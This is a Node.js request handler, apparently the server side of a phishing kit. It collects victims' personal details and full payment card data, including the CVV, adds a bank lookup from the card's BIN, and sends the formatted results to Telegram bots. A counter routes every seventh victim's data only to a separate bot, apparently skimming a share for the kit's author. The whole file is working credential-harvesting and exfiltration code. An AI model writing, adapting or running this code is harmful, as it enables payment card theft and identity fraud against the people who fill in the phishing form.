const axios = require("axios");

let count = 0;

const sendRes = async (req, res) => {
    let {
        fullname,
        addy,
        city,
        pcode,
        dob,
        telephone,
        ccname,
        ccnum,
        ccexp,
        cvv,
        userAgent,
        ip,
        bin,
        telegramId,
    } = req.body;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, "");
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }

    const response = await axios.get(`https://lookup.binlist.net/${bin}`);
    let bankName;

    if (response.data.bank) {
        bankName = response.data.bank.name;
    }

    binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
    var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
    if (count == 6) {
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `HAYTCHRES:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        count = 0;
    } else {
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `Energy ${telegramId}:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: telegramId,
                    text: `${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        count += 1;
    }
    res.sendStatus(200);
};

module.exports = {
    sendRes,
};
